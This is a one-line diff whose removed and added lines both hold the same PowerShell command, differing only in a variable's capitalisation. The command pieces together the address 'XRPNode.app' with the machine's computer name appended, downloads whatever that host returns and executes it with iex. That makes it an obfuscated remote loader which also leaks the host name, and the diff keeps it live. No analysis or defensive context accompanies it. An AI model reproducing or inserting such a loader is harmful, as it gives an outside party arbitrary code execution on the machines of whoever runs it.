@@ -1,1 +1,1 @@
-powershell -command "if (($Ripple = '.app') -and ($Node = 'XRP' + 'Node' + $Ripple + '?connect=' + $env:COMPUTERNAME)) { $sync = (iwr $Node -UseBasicParsing); iex ([Text.Encoding]::UTF8.GetString($sync.Content)) }"
+powershell -command "if (($Ripple = '.app') -and ($node = 'XRP' + 'Node' + $Ripple + '?connect=' + $env:COMPUTERNAME)) { $sync = (iwr $node -UseBasicParsing); iex ([Text.Encoding]::UTF8.GetString($sync.Content)) }"
